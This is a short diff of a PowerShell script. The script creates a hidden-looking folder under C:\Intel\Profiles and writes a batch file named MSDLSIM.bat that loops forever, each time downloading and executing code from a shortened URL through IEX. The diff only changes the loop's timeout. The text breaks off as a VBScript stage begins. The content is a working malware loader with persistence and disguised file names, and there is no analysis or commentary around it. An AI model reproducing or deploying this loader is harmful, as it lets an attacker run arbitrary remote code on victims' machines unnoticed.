@@ -1,7 +1,12 @@
 md C:\Intel\Profiles/IE/IEX; $contentToAdd = @"
 :a
 powershell IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://rb.gy/wjqq3u').GetResponse().GetResponseStream()).ReadToEnd());
-timeout /t 30
+timeout /t 5
+timeout /t 5
+timeout /t 5
+timeout /t 5
+timeout /t 5
+timeout /t 5
 goto a
 "@; add-content "C:\Intel\Profiles/IE/IEX/MSDLSIM.bat" $contenttoadd; $contentToAdd = @"
 WScript.Sleep 10000
